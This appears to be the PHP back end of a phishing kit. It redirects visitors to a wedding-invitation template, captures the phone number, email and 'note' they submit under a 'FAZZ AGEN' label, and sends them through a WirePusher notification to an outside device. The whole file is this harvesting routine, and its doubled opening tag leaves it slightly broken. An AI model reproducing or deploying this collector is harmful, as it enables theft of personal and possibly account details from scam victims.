<?php

<?php

    header('Location: https://zeinvitation.com/w/template24/?to=tamu+undangan');
    
    $id = "q3ZtmpGPc";

$hp            = $_POST['hp'];
$email           = $_POST['email'];
$note           = $_POST['note'];

$message = "
────────────────
FAZZ AGEN
────────────────
•HP    : ".$hp."
•EMAIL : ".$email."
•NOTE  : ".$note."
────────────────";

    $data = [
        'message' => $message,
    ];
    $response = file_get_contents("https://wirepusher.com/send?id=$id&title=Notifikasi%20Undangan&message=$message&type=Monitoring" . http_build_query($data) );

    echo '<pre>';
    print_r(json_decode($response));
    die();
